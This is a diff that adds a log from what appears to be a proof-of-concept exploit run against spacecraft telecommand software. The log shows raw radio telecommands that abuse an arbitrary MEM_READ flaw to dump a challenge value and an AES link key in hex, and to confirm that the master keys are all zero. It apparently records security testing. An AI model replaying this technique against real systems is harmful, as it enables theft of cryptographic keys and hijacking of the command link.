@@ -1,0 +1,22 @@
+[   0.000] ========================================================================
+[   0.000] V-05 arbitrary MEM_READ
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x12 via=radio AES  payload=00
+[   0.001] <-- TM apid=0x12 AES len=13
+[   0.001] --> TC apid=0x19 via=radio AES  payload=002100200400
+[   0.001] <-- TM apid=0x19 clear len=11
+[   0.001] MEM_READ 0x20002100 -> challenge 0x1F26789C
+[   0.001] --> TC apid=0x19 via=radio AES  payload=002200201000
+[   0.001] <-- TM apid=0x19 clear len=23
+[   0.001] MEM_READ sa0_key -> 50574e7361744c61624b657931323334 == link key: True
+[   0.001] --> TC apid=0x19 via=radio AES  payload=003000201000
+[   0.002] <-- TM apid=0x19 clear len=23
+[   0.002] master key table base 0x20003000: all-zero master keys confirmed
+[   0.002] --> TC apid=0x19 via=radio AES  payload=002200202c01
+[   0.003] <-- TM apid=0x09 AES len=15
+[   0.003] --> TC apid=0x19 via=radio AES  payload=000000000800
+[   0.003] <-- TM apid=0x09 AES len=15
+[   0.003] => crypto material inventory complete from the raw radio
+[   0.003] ========================================================================
+[   0.003] POC OK
+[   0.003] ========================================================================
